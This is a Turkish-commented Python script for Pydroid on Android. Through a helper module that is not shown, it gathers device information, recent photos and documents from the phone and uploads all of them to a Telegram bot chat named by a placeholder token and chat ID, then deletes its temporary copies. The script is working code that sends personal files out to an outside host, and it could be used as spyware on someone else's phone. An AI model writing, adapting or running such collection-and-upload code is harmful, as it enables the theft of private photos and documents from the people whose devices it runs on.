"""
Pydroid'de çalışacak örnek kod
"""
import os
import tempfile
from phone_data_collector import DataCollector, TelegramSender, PermissionManager

# Telegram bilgileri (kendi bilgilerinizi girin)
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # @BotFather'dan alın
CHAT_ID = "YOUR_CHAT_ID_HERE"      # Telegram ID'niz

def main():
    print("=== Telefon Veri Toplama Başlıyor ===")
    
    # 1. İzinleri kontrol et
    perm_manager = PermissionManager()
    
    if not perm_manager.check_permissions():
        print("İzinler isteniyor...")
        if not perm_manager.request_storage_permission():
            print("İzin verilmedi!")
            return
    
    # 2. Veri toplayıcıyı başlat
    collector = DataCollector()
    
    # 3. Sistem bilgilerini al
    print("Sistem bilgileri alınıyor...")
    system_info = collector.get_system_info()
    
    # 4. Fotoğrafları topla
    print("Son fotoğraflar taranıyor...")
    photos = collector.collect_photos(max_count=5)
    print(f"{len(photos)} fotoğraf bulundu")
    
    # 5. Dökümanları topla
    print("Dökümanlar taranıyor...")
    docs = collector.collect_documents(max_count=5)
    print(f"{len(docs)} döküman bulundu")
    
    # 6. Geçici dizin oluştur
    temp_dir = tempfile.mkdtemp()
    print(f"Geçici dizin: {temp_dir}")
    
    # 7. Bilgi dosyasını oluştur
    info_file = collector.create_info_file(temp_dir)
    
    # 8. Dosyaları kopyala
    copied_files = collector.copy_files_to_cache(temp_dir)
    
    # 9. Telegram'a gönder
    print("Telegram'a gönderiliyor...")
    sender = TelegramSender(BOT_TOKEN, CHAT_ID)
    
    # Özet mesajı gönder
    summary = f"""
📱 <b>Telefon Veri Raporu</b>

🖥 Cihaz: {system_info['device']}
📸 Fotoğraf: {len(photos)}
📄 Döküman: {len(docs)}
⏱ Zaman: {system_info['time']}

#pydroid #data
    """
    sender.send_message(summary)
    
    # Bilgi dosyasını gönder
    sender.send_file(info_file, "📊 Telefon bilgi dosyası")
    
    # Toplanan dosyaları gönder
    if copied_files:
        print(f"{len(copied_files)} dosya gönderiliyor...")
        sender.send_multiple_files(copied_files)
    
    print("✅ İşlem tamamlandı!")
    
    # Temizlik
    import shutil
    shutil.rmtree(temp_dir)

if __name__ == "__main__":
    main()
